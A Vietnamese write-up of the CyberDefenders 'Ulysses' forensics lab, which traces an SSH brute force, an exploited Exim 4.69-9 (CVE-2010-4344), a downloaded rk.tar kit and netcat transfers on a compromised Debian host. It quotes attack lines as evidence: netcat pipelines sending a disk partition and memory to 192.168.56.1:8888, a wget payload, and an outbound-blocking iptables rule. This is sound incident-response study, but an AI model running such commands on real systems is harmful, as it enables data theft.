+++
title = "CyberDefenders - Ulysses Lab Writeup"
date = 2026-10-19T00:00:00+07:00
draft = false
tags = ["CyberDefenders", "Linux", "Memory Forensics", "Disk Forensics", "Volatility", "Exim", "Incident Response"]
categories = ["Writeups"]
summary = "Điều tra máy Debian bị xâm nhập: truy vết brute force, Exim 4.69-9, payload rk.tar và hoạt động chuyển dữ liệu qua Netcat."
ShowToc = true
TocOpen = false
+++

Ulysses là bài điều tra một máy Linux bị xâm nhập. Từ ảnh đĩa, log xác thực và bộ nhớ, ta xác định tài khoản bị dò mật khẩu, các địa chỉ liên quan, dịch vụ Exim bị lợi dụng và dấu vết chuyển dữ liệu ra ngoài.

| Nguồn dữ liệu | Mục tiêu phân tích |
| --- | --- |
| `victoria-v8.sda1.img` | Cấu hình hệ điều hành, log xác thực, log Exim và file tải xuống |
| `victoria-v8.memdump.img` | Tiến trình, kết nối mạng và lịch sử lệnh trong bộ nhớ |
| `/var/log/auth.log` | Hoạt động đăng nhập và brute force |
| `/var/log/exim4/rejectlog` | Email bị từ chối, header bất thường và dấu vết payload |

**Công cụ:** FTK Imager, Volatility 2 và các lệnh lọc log. Ảnh được giữ theo thứ tự thực hành; các kết luận bên dưới dựa trên những artifact hiển thị trong ảnh.

## Q1: The attacker was performing a Brute Force attack. What account triggered the alert?

Mở ảnh đĩa trong FTK Imager và tìm `auth.log` dưới thư mục log. Những dòng SSH thất bại lặp lại chứa cùng tên đăng nhập:

```text
Failed password for invalid user ulysses from 192.168.56.1
```

![Các lần SSH thất bại nhắm đến tên đăng nhập ulysses trong auth.log](/images/imported/ulysses/ulysses-01.png)

Tên cần trả lời là **ulysses**. Cụm `invalid user` cho biết SSH không công nhận tên người dùng đó tại thời điểm ghi log; việc nó xuất hiện trong brute force không có nghĩa tài khoản này đã đăng nhập thành công.

> **Đáp án:** `ulysses`

## Q2: How many unique failed login attempts were there?

Xuất `auth.log` để lọc các dòng chứa `Failed`, rồi nhóm các dòng giống hệt nhau:

```bash
grep -i 'Failed' auth.log | sort | uniq -c
```

![Nhóm các dòng xác thực thất bại, gồm nhiều lần thử với ulysses và một dòng FAILED LOGIN của root](/images/imported/ulysses/ulysses-02.png)

Ảnh cho thấy một số dòng có hệ số `2` hoặc `3` ở đầu. `uniq -c` đếm số lần một dòng nguyên văn xuất hiện, trong khi `wc -l` trên kết quả lọc ban đầu chỉ đếm tổng số dòng khớp:

```bash
grep -i 'Failed' auth.log | wc -l
```

![Phép đếm dòng thô trong ảnh trả về 33](/images/imported/ulysses/ulysses-03.png)

**Đáp án được chốt trong ghi chú thực hành là 32**, với lưu ý phải xem cả dòng đăng nhập thất bại của `root`, không chỉ lọc tên `ulysses`. Tuy nhiên, ảnh `wc -l` đang hiển thị **33**, nên không thể dùng riêng ảnh này để chứng minh kết quả 32 hoặc gọi đó là số lần thử duy nhất đã được kiểm chứng.

Để kiểm tra lại chính xác cần đối chiếu log gốc, xác định cách gộp sự kiện và phạm vi đếm. Dòng `root` trong ảnh thuộc đăng nhập console vào ngày khác với đợt SSH brute force; không nên mặc định quy nó cho cùng một cuộc tấn công. Tương tự, các bản ghi `Failed none` và `Failed password` có ý nghĩa khác nhau, nên số dòng có từ `Failed` không tự động bằng số lần nhập sai mật khẩu.

> **Đáp án theo ghi chú thực hành:** `32` — cần đối chiếu log gốc để giải quyết chênh lệch với ảnh đếm dòng.

## Q3: What kind of system runs on the targeted server?

Trong FTK Imager, mở `/etc/issue`. Nội dung nhận diện hệ điều hành là:

```text
Debian GNU/Linux 5.0 \n \l
```

![File etc/issue nhận diện Debian GNU/Linux 5.0](/images/imported/ulysses/ulysses-04.png)

Hai chuỗi `\n` và `\l` là các ký hiệu trong login banner, không phải thành phần của tên phiên bản. Thông tin cần lấy là **Debian GNU/Linux 5.0**.

> **Đáp án:** `Debian GNU/Linux 5.0`

## Q4: What is the victim's IP address?

Xem kết nối mạng thu được từ bộ nhớ, chú ý cột địa chỉ local và remote thay vì chỉ tìm IP xuất hiện nhiều nhất. Các kết nối đang thiết lập có cùng địa chỉ local **192.168.56.102**.

![Kết nối mạng của máy nạn nhân với địa chỉ local 192.168.56.102](/images/imported/ulysses/ulysses-05.png)

Các dòng liên quan gồm:

| Local endpoint | Remote endpoint | Tiến trình / trạng thái |
| --- | --- | --- |
| `192.168.56.102:43327` | `192.168.56.1:4444` | `sh/2065`, ESTABLISHED |
| `192.168.56.102:25` | `192.168.56.101:37202` | `sh/2065`, CLOSE |
| `192.168.56.102:56955` | `192.168.56.1:8888` | `nc/2169`, ESTABLISHED |

Việc nhiều dòng có cùng endpoint không nhất thiết biểu thị nhiều phiên TCP độc lập; đầu ra từ bộ nhớ có thể liệt kê socket gắn với các file descriptor khác nhau. Để trả lời câu hỏi này, địa chỉ local đã đủ nhận diện máy nạn nhân.

> **Đáp án:** `192.168.56.102`

## Q5: What are the attacker's two IP addresses? Format: comma-separated in ascending order

Hai địa chỉ remote đáng chú ý là **192.168.56.1** và **192.168.56.101**.

![Hai địa chỉ remote xuất hiện trong các kết nối liên quan đến shell, SMTP và Netcat](/images/imported/ulysses/ulysses-06.png)

`192.168.56.1` xuất hiện ở phía nhận kết nối đến cổng `4444` và `8888`; địa chỉ này cũng là nguồn bộ cài Exim và file `rk.tar` trong các artifact phía sau. `192.168.56.101` liên quan đến kết nối vào cổng SMTP `25`; rejectlog ở Q9 tiếp tục ghi nhận email bất thường từ địa chỉ này.

Như vậy, vai trò của hai IP được củng cố bởi cả kết nối mạng, lịch sử lệnh và log ứng dụng. Viết theo thứ tự tăng dần như đề yêu cầu:

> **Đáp án:** `192.168.56.1,192.168.56.101`

## Q6: What is the "nc" service PID number that was running on the server?

Trong danh sách tiến trình từ bộ nhớ, tìm tên `nc`. Dòng tương ứng hiển thị **PID 2169**, PPID `2042`, cùng tiến trình `memdump` có PID `2168` ở ngay phía trên.

![Danh sách tiến trình cho thấy nc có PID 2169](/images/imported/ulysses/ulysses-07.png)

Có thể dùng kết quả `linux_pslist` của Volatility 2 để đọc PID, sau đó đối chiếu với kết nối `nc/2169` đến `192.168.56.1:8888` ở Q4. Cách kiểm tra chéo này giúp nối tên tiến trình với hoạt động mạng thực tế trong snapshot.

> **Đáp án:** `2169`

## Q7: What service was exploited to gain access to the system? (one word)

Danh sách command line cho thấy dịch vụ thư **Exim4** đang chạy:

```text
/usr/sbin/exim4 -bd -q30m
```

![Command line của Exim4 và tiến trình nc trong bộ nhớ](/images/imported/ulysses/ulysses-08.png)

Sự hiện diện của một dịch vụ chưa đủ để kết luận nó bị khai thác. Dấu vết quan trọng hơn nằm trong lịch sử Bash thu được từ bộ nhớ:

![Lịch sử gỡ Exim4, lấy bộ cài từ 192.168.56.1 và cài phiên bản 4.69-9](/images/imported/ulysses/ulysses-09.png)

Các lệnh trong ảnh cho thấy quá trình gỡ các thành phần Exim4, lấy bộ cài từ máy `192.168.56.1`, rồi cài lại phiên bản **4.69-9**. Đáng chú ý là nguồn tải qua SCP:

```text
scp yom@192.168.56.1:/home/yom/temporary/exim4/* .
```

Đây chính là mối liên hệ bạn đã chỉ ra: IP này đã được nhận diện trong các kết nối của phía tấn công; bộ cài Exim lại được lấy từ cùng địa chỉ. Tên gói ở Q8 cho thấy đó là phiên bản có lỗ hổng, còn rejectlog ở Q9 chứa header SMTP bất thường và payload tải file từ IP ấy.

Chuỗi bằng chứng nối lại thành: **Exim đang chạy → lịch sử thay bộ cài bằng phiên bản dễ bị tấn công → SMTP có payload bất thường**. Kết luận phù hợp là dịch vụ bị lợi dụng là **Exim**.

Riêng lịch sử cài lại gói cho thấy hệ thống đã bị thay đổi, nhưng không đủ xác định ai thực hiện từng lệnh hay chứng minh thứ tự xâm nhập ban đầu. Kết luận về dịch vụ dựa trên cả chuỗi artifact, đặc biệt là log SMTP, thay vì chỉ dựa vào thao tác gỡ/cài.

> **Đáp án:** `exim`

## Q8: What is the CVE number of exploited vulnerability?

Ảnh lịch sử cài đặt cho thấy tên gói:

```text
exim4-daemon-light_4.69-9_i386.deb
```

![Tên gói Exim4 daemon light phiên bản 4.69-9](/images/imported/ulysses/ulysses-10.png)

Đối chiếu với thông báo bảo mật Debian: **CVE-2010-4344** là lỗi hỏng bộ nhớ của Exim, liên quan đến heap buffer overflow trong hàm `string_vformat`. Việc xử lý và ghi log một thông điệp SMTP có header được tạo đặc biệt có thể dẫn tới thực thi mã. Debian đã sửa lỗi này trong **4.69-9+lenny1**; vì vậy phải đọc đủ revision của gói, không chỉ thấy `4.69` rồi kết luận. [Debian DSA-2131-1](https://lists.debian.org/debian-security-announce/2010/msg00181.html), [Debian Security Tracker](https://security-tracker.debian.org/tracker/CVE-2010-4344).

![Ghi chú tra cứu CVE-2010-4344 trong quá trình thực hành](/images/imported/ulysses/ulysses-11.png)

Bản `4.69-9` hiển thị trong ảnh chưa có hậu tố bản vá nói trên. Kết hợp với rejectlog chứa header dài, thông báo message quá lớn và dấu vết payload ở Q9, CVE phù hợp với bài là **CVE-2010-4344**. Tên phiên bản đơn lẻ dùng để khoanh vùng; log ứng dụng giúp củng cố việc khai thác.

> **Đáp án:** `CVE-2010-4344`

## Q9: During this attack, the attacker downloaded two files to the server. Provide the name of the compressed file.

Trong ảnh đĩa, duyệt thư mục `/tmp`. File nén đáng chú ý là **rk.tar**.

![File rk.tar được tìm thấy trong thư mục tmp của ảnh đĩa](/images/imported/ulysses/ulysses-12.png)

Tiếp tục kiểm tra `/var/log/exim4/rejectlog` để xác định file có liên quan đến tấn công hay chỉ tình cờ nằm trong thư mục tạm. Log có nhiều header dài và một biểu thức gọi shell, bên trong chứa lệnh `wget` tải file từ **192.168.56.1** về **/tmp/rk.tar**.

![Rejectlog chứa header bất thường, địa chỉ 192.168.56.101 và payload tải rk.tar từ 192.168.56.1](/images/imported/ulysses/ulysses-13.png)

Ba điểm khớp nhau là tên file `rk.tar`, nơi lưu `/tmp` và IP cung cấp `192.168.56.1`. Log còn ghi nhận nguồn SMTP `192.168.56.101`, củng cố vai trò của cả hai IP ở Q5.

Sự xuất hiện của lệnh trong log chứng minh có nội dung tải file trong payload; file hiện diện trên ảnh đĩa bổ sung bằng chứng về artifact đã được lưu. Phần script ở Q11 giúp xem tiếp các hành vi liên quan đến bộ file này.

> **Đáp án:** `rk.tar`

## Q10: Two ports were involved in the process of data exfiltration. Provide the port number of the highest one.

Lịch sử Bash ghi nhận hai pipeline chuyển dữ liệu tới Netcat. Các dòng dưới đây là trích đoạn bằng chứng trong ảnh:

```text
dd if=/dev/sda1 | nc 192.168.56.1 8888
memdump | nc 192.168.56.1 8888
```

![Lịch sử lệnh chuyển dữ liệu phân vùng và bộ nhớ tới Netcat trên cổng 8888](/images/imported/ulysses/ulysses-14.png)

Pipeline đầu đọc phân vùng `/dev/sda1` rồi đưa dữ liệu cho `nc`; pipeline sau đưa đầu ra của `memdump` tới cùng đích. Trong bảng kết nối ở Q4, Netcat có endpoint:

```text
192.168.56.102:56955 -> 192.168.56.1:8888
```

Hai port của kết nối là **56955** ở phía local và **8888** ở phía remote. Câu hỏi yêu cầu số lớn hơn nên đáp án là **56955**, dù `8888` mới là cổng nhận được chỉ định trong lệnh. Cần đọc đủ hai đầu kết nối để tránh trả lời nhầm cổng đích.

> **Đáp án:** `56955`

## Q11: Which port did the attacker try to block on the firewall?

Kiểm tra các script trong thư mục `rk`. Ảnh cho thấy script chuẩn bị các file `dropbear`, `busybox`, `mig`, đồng thời thêm lệnh vào file khởi động của hệ thống.

![Script chứa quy tắc iptables chặn TCP destination port 45295 và thao tác thiết lập tự khởi động](/images/imported/ulysses/ulysses-15.png)

Dòng quan trọng là chuỗi được ghi vào `/etc/init.d/boot.local`:

```text
/usr/sbin/iptables -I OUTPUT 1 -p tcp --dport 45295 -j DROP
```

Đọc lần lượt các thành phần: `OUTPUT` là lưu lượng đi ra, `-p tcp` chọn TCP, `--dport 45295` chọn cổng đích và `DROP` loại bỏ gói tin. Vì vậy port cần trả lời là **45295**.

Ảnh thể hiện ý định ghi quy tắc để thực thi khi khởi động, với điều kiện file `boot.local` có thể thực thi. Chỉ từ nội dung script chưa thể xác nhận quy tắc đã được nạp vào firewall đang chạy. Các đoạn thêm `dropbear` vào file startup cũng là dấu vết thiết lập khả năng truy cập trở lại sau reboot.

> **Đáp án:** `45295`

## Kết nối các dấu vết

`auth.log` ghi nhận brute force nhắm tới tên `ulysses`. Dữ liệu bộ nhớ xác định máy nạn nhân **192.168.56.102**, các kết nối tới **192.168.56.1** và **192.168.56.101**, cùng Netcat PID **2169**.

Phần nổi bật của vụ việc là Exim: lịch sử lệnh chứa thao tác thay bộ cài bằng **4.69-9** lấy từ `192.168.56.1`, trong khi rejectlog ghi header SMTP bất thường và payload tải **rk.tar**. Phiên bản và dạng lỗi phù hợp với **CVE-2010-4344**. Cuối cùng, các pipeline Netcat cho thấy lệnh chuyển dữ liệu đĩa và bộ nhớ ra ngoài, còn script để lại dấu vết tự khởi động và ý định chặn cổng **45295**.

Khi dựng lại diễn biến, cần nối log, tiến trình, kết nối và file trên đĩa với nhau. Một lịch sử lệnh cho biết có chuỗi thao tác được lưu lại; để kết luận thao tác đã thành công phải đối chiếu thêm kết quả hoặc artifact tương ứng.
